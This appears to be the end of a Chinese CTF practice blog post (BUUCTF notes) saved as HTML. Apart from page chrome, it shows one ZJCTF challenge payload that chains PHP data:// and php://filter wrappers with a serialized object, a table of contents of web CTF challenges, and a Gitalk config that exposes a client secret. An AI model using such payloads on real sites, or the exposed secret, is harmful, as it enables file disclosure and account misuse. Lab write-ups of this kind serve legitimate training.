+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>查看源码得知flag</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lego
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/" title="BUUCTF刷题笔记">https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB/" rel="tag"># WEB</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/07/一个有趣的任意密码重置/" rel="next" title="一个有趣的任意密码重置">
+                <i class="fa fa-chevron-left"></i> 一个有趣的任意密码重置
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+ <div id="gitalk-container"></div>
+ 
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png"
+                alt="lego" />
+            
+              <p class="site-author-name" itemprop="name">lego</p>
+              <p class="site-description motion-element" itemprop="description">从小菜鸡往大菜鸡成长的路上...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">1.2.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">1.3.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-EasySQL"><span class="nav-number">1.4.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#护网杯-2018-easy-tornado"><span class="nav-number">1.5.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Havefun"><span class="nav-number">1.6.</span> <span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">1.7.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-number">1.8.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-number">1.9.</span> <span class="nav-text">[HCTF 2018]admin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#flask-sessions伪造"><span class="nav-number">1.9.1.</span> <span class="nav-text">flask sessions伪造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unicode欺骗"><span class="nav-number">1.9.2.</span> <span class="nav-text">Unicode欺骗</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-LoveSQL"><span class="nav-number">1.10.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-PHP"><span class="nav-number">1.11.</span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">1.12.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-number">1.13.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-number">1.14.</span> <span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">1.15.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-number">1.16.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-number">1.17.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-BabySQL"><span class="nav-number">1.18.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">1.19.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网鼎杯-2018-Fakebook"><span class="nav-number">1.20.</span> <span class="nav-text">[网鼎杯 2018]Fakebook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Upload"><span class="nav-number">1.21.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-高明的黑客"><span class="nav-number">1.22.</span> <span class="nav-text">[强网杯 2019]高明的黑客</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-BuyFlag"><span class="nav-number">1.23.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-BackupFile"><span class="nav-number">1.24.</span> <span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Upload"><span class="nav-number">1.25.</span> <span class="nav-text">[ACTF2020 新生赛]Upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="nav-number">1.26.</span> <span class="nav-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lego</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '76aae4c57ee7f811d638',
+          clientSecret: 'd6d32a0bf34087bf9ee31a1a74fd5bd72cc23c92',
+          repo: 'legoc.github.io',
+          owner: 'legoc',
+          admin: ['legoc'],
+          id: decodeURI(window.location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+	   
+	   
+	   
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
